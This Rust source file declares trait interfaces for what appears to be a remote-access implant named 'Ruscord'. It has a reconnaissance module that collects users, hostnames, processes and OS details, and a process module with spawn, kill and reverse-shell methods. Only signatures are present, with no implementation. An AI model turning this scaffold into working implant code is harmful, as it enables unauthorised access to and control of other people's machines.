pub mod recon {
	pub trait ReconModule {
		/// Returns the currently logged in user
		fn username(&self) -> String;
		/// Returns the currently logged in hostname
		fn hostname(&self) -> String;
		/// Returns the list of running processes on the host;
		fn processes(&self) -> Option<Vec<Process>>;
		/// Retrieves OS version information
		fn os_version(&self) -> String;
		/// Retrieves the list of users and their groups on the host.
		fn users(&self) -> Vec<User>;
	}

	#[derive(Debug)]
	/// A representation of a running process on the host, with the name of the
	/// process, its PID, and its parent's PID.
	pub struct Process {
		pub name: String,
		pub pid: u32,
		pub ppid: u32,
	}

	#[derive(Debug)]
	pub struct User {
		pub name: String,
		pub uid: u32,
		pub groups: Vec<Group>,
	}

	#[derive(Debug)]
	pub struct Group {
		id: u32,
		name: String,
	}
}

pub mod process {
	use std::{future::Future, net::IpAddr, pin::Pin};

	use crate::RuscordError;

	pub trait ProcessModule {
		/// Spawns a new process on the host with the given name and arguments,
		/// returning the PID of the new process.
		fn spawn(&self, name: &str, args: Option<String>) -> Result<(), RuscordError>;

		/// Kills the process with the given pid and exit code.
		///
		/// If no exit code is provided, a default exit code of 0 will be used.
		fn kill_other(&self, pid: u32, exit_code: Option<u32>) -> Result<(), RuscordError>;

		/// Kills the current process.
		///
		/// If no exit code is provided, a default exit code of 0 will be used.
		fn kill_self(&self, exit_code: Option<u32>) -> !;

		/// Spawns a reverse shell
		fn reverse_shell(
			&self, ip: IpAddr, port: u16,
		) -> Pin<Box<dyn Future<Output = Result<(), RuscordError>> + Send + Sync>>;
	}
}
